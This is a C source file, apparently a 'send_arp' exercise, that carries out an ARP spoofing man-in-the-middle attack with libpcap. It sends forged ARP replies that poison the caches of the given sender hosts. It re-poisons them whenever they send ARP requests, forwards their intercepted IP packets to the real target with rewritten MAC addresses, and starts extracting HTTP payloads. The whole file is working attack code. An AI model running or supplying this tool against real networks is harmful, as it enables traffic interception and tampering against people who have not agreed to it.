#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <pcap.h>
#include <net/if.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <arpa/inet.h>
#include <unistd.h>
#include "send_arp.h"



int main(int argc, char * argv[]){
    int num = (argc-2)/2;
    unsigned char** arp_packet = (unsigned char **)calloc(num, sizeof(char *));
    unsigned char** arp_t_packet = (unsigned char **)calloc(num, sizeof(char *));
    char * dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    int fd;
    struct ifreq ifr_m;
    struct ifreq ifr_i;
    unsigned char *mac;
    uint8_t t_mac[num][6];
    uint32_t *ip;
    fd = socket(AF_INET, SOCK_DGRAM, 0);
    ifr_m.ifr_addr.sa_family = AF_INET;
    ifr_i.ifr_addr.sa_family = AF_INET;
    strncpy(ifr_m.ifr_name , dev , IFNAMSIZ-1);
    strncpy(ifr_i.ifr_name , dev , IFNAMSIZ-1);
    ioctl(fd, SIOCGIFHWADDR, &ifr_m);
    ioctl(fd, SIOCGIFADDR, &ifr_i);
    close(fd);
    mac = (unsigned char *)ifr_m.ifr_hwaddr.sa_data;
    ip = (uint32_t *)&(((struct sockaddr_in *)&ifr_i.ifr_addr)->sin_addr);
    //----------------mac addr------------------

    printf("Mac : %.2x:%.2x:%.2x:%.2x:%.2x:%.2x\n" , mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    printf("IP : %s\n", inet_ntoa(*(struct in_addr *)ip));
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    for(int i=0; i<num; i++){
        arp_packet[i] = request(mac, ip, argv[(i+1)*2]);
        pcap_sendpacket(handle, arp_packet[i], 42);
        int a=1;
        while (true){
            if(a%1000==0){
            pcap_sendpacket(handle, arp_packet[i], 42);
            printf("a = %d --retry send packet--\n",a);
            }
            struct pcap_pkthdr* header;
            const unsigned char* packet;
            int res = pcap_next_ex(handle, &header, &packet);
            a++;
            if (res == 0) continue;
            struct eth_header *eth = (struct eth_header *)packet;
            if(ntohs(eth->eth_type) == 0x0806) {
                struct arp_header *arp = (struct arp_header *)(packet + sizeof(*eth));
                if (ntohs(arp->opcode) == 0x0002 && arp->sip == inet_addr(argv[(i+1)*2]) && arp->dip == *ip){
                    memcpy(arp_packet[i], &eth->smac, sizeof(uint8_t)*6);
                    memcpy(arp_packet[i]+32, &eth->smac, sizeof(uint8_t)*6);
                    uint32_t t_ip = inet_addr(argv[(i+1)*2+1]);
                    memcpy(arp_packet[i]+28, &t_ip, sizeof(uint8_t)*4);
                    *(arp_packet[i]+21) = 0x02;
                    break;
                }
            }
        }
    }

    for(int i=0; i<num; i++){
        arp_t_packet[i] = request(mac, ip, argv[(i+1)*2+1]);
        pcap_sendpacket(handle, arp_t_packet[i], 42);
        while (true){
            struct pcap_pkthdr* header;
            const unsigned char* packet;
            int res = pcap_next_ex(handle, &header, &packet);
            if (res == 0) continue;
            struct eth_header *eth = (struct eth_header *)packet;
            if(ntohs(eth->eth_type) == 0x0806) {
                struct arp_header *arp = (struct arp_header *)(packet + sizeof(*eth));
                if (ntohs(arp->opcode) == 0x0002 && arp->sip == inet_addr(argv[(i+1)*2+1]) && arp->dip == *ip ){
                    memcpy(t_mac[i], &eth->smac, sizeof(uint8_t)*6);
                    break;
                }
            }
        }
    }

    for(int i=0; i<num; i++){
        pcap_sendpacket(handle, arp_packet[i], 42);
        printf("arp_packet[%d] success\n", i);
    }
    while (true){
        struct pcap_pkthdr* header;
        const unsigned char* packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;

        struct eth_header *eth = (struct eth_header *)packet;
        int p=0;
        for(int i=0; i<6; i++){
            if(eth->dmac[i] == 0xff)
                p++;
        }
        if(ntohs(eth->eth_type) == 0x0806) {
            struct arp_header *arp = (struct arp_header *)(packet + sizeof(*eth));
            for(int i=0; i<num; i++){
                if (ntohs(arp->opcode) == 0x0001 && p == 6 && !strncmp((const char *)(packet+6), (const char *)arp_packet[i], 6)){
                    for(int j=0; j<num; j++){
                        pcap_sendpacket(handle, arp_packet[j], 42);
                        printf("send arp_packet[%d]\n",j);
                    }
                    printf("-----success ARP broadcast case-----\n");
                }
                if (ntohs(arp->opcode) == 0x0001 && !strncmp((const char *)(packet+6), (const char *)arp_packet[i], 6) && !strncmp((const char *)packet, (const char *)(arp_packet[i]+6), 6) && arp->dip == inet_addr(argv[(i+1)*2+1])){
                    pcap_sendpacket(handle, arp_packet[i], 42);
                    printf("-----success ARP unicast case %d-----\n",i+1);
                }
            }
        }

        if(ntohs(eth->eth_type) == 0x0800){
            struct ip_header *ip = (struct ip_header *)(packet + sizeof(*eth));
            uint16_t ipv4_len = (ip->ipv4_len & 0x0F)<<2;
            for(int i=0; i<num; i++){
                if(!strncmp((const char *)(packet+6), (const char *)arp_packet[i], 6) && p==6 ){
                    for(int j=0; j<num; j++){
                        pcap_sendpacket(handle, arp_packet[j], 42);
                        printf("send arp_packet[%d]\n",j);
                    }
                    printf("-----success IP case-----\n");
                }
                else if(!strncmp((const char *)packet, (const char *)mac, 6) && !strncmp((const char *)(packet+6), (const char *)arp_packet[i], 6)){
                    printf("%dst packet send\n",i+1);

                    memcpy((void *)(packet+6), mac, sizeof(uint8_t)*6);
                    memcpy((void *)packet, t_mac[i], sizeof(uint8_t)*6);

                    pcap_sendpacket(handle, packet, ntohs(ip->packet_len)+14);
                    printf("success send packet\n");
                    printf("\n");
                }
            }
            if(ip->pid == 6){
                struct tcp_header *tcp = (struct tcp_header *)((uint8_t *)ip + ipv4_len);
                uint16_t tcp_len = (tcp->hlen & 0xF0)>>2;
                if((ntohs(tcp->sport) == 80 || ntohs(tcp->dport) == 80)){
                    char *http_data = (char *)((uint8_t *)tcp + tcp_len);
                }
            }
        }

    }
    pcap_close(handle);
    for(int i=0; i<num; i++){
        free(arp_packet[i]);
        free(arp_t_packet[i]);
    }
    return 0;
}
